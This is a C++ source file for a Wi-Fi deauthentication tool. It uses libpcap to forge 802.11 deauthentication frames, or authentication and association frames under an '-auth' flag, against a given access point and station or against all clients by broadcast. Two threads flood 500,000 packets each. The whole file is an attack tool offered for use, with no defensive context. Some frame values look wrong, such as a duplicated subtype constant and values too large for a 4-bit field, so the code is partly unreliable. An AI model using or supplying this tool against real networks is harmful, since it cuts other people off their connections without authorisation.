#include <pcap.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <unistd.h>
#include <iomanip>
#include <thread>
#include "mac_address.h"

#define DEAUTH 0x00c0
#define AUTH 0x00b0
#define AUSSO 0x00c0

using namespace std;

#pragma pack(push, 1)
struct RadiotapHeader {
    uint8_t  version = 0;
    uint8_t  pad = 0;
    uint16_t length = sizeof(RadiotapHeader);
    uint32_t present = 0;
};

struct Frame80211 {
    uint8_t version : 2 = 0;
    uint8_t type : 2 = 0;
    uint8_t subtype : 4;
    uint8_t flags = 0;
    uint16_t duration = 0;
    MacAddress address1;
    MacAddress address2;
    MacAddress address3;
    uint16_t sequence_control = 0;
};
#pragma pack(pop)

void usage() {
    printf("Usage: deauth <interface> <ap mac> [<station mac> [-auth]]\n");
}

void make_packet(uint8_t* packet, const MacAddress& src_mac, const MacAddress& dest_mac, uint8_t subtype) {
    RadiotapHeader rth;
    Frame80211 frame{};
    frame.subtype = subtype;
    frame.address1 = dest_mac;
    frame.address2 = src_mac;
    frame.address3 = src_mac;
    
    uint8_t fixed_params[12] = {0x00, 0x07};
    size_t offset = 0;

    memcpy(packet + offset, &rth, sizeof(rth));
    offset += sizeof(rth);
    memcpy(packet + offset, &frame, sizeof(frame));
    offset += sizeof(frame);
    memcpy(packet + offset, fixed_params, sizeof(fixed_params));
}

void send_packets(pcap_t* pcap, uint8_t* packet1, uint8_t* packet2) {
    auto send_task = [&](uint8_t* packet) {
        for (int i = 0; i < 500000; i++) {
            if (pcap_sendpacket(pcap, packet, sizeof(RadiotapHeader) + sizeof(Frame80211) + 12) != 0) {
                fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(pcap));
            } else { printf("Packet sent successfully!"); }
            usleep(10000);
        }
    };
    
    thread thread1(send_task, packet1);
    thread thread2(send_task, packet2);
    
    thread1.join();
    thread2.join();
}

int main(int argc, char* argv[]) {
    if (argc < 3 || argc > 5) {
        usage();
        return EXIT_FAILURE;
    }

    char* interface = argv[1];
    MacAddress ap_mac = parse_mac(argv[2]);
    MacAddress station_mac{};
    bool has_station_mac = (argc >= 4);
    bool is_auth_attack = (argc == 5 && strcmp(argv[4], "-auth") == 0);

    if (has_station_mac) {
        station_mac = parse_mac(argv[3]);
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (!pcap) {
        fprintf(stderr, "pcap_open_live error: %s\n", errbuf);
        return EXIT_FAILURE;
    }

    uint8_t packet1[256], packet2[256];
    if (has_station_mac && is_auth_attack) {
        make_packet(packet1, station_mac, ap_mac, AUTH);
        make_packet(packet2, station_mac, ap_mac, AUSSO);
        send_packets(pcap, packet1, packet2);
    } else if(has_station_mac){
        make_packet(packet1, ap_mac, station_mac, DEAUTH);
        make_packet(packet2, station_mac, ap_mac, DEAUTH);
        send_packets(pcap, packet1, packet2);
    }else {
        make_packet(packet1, ap_mac, make_mac(0xff, 0xff, 0xff, 0xff, 0xff, 0xff), DEAUTH);
        make_packet(packet2, ap_mac, make_mac(0xff, 0xff, 0xff, 0xff, 0xff, 0xff), DEAUTH);
        send_packets(pcap, packet1, packet2);
    }
    pcap_close(pcap);
    return 0;
}
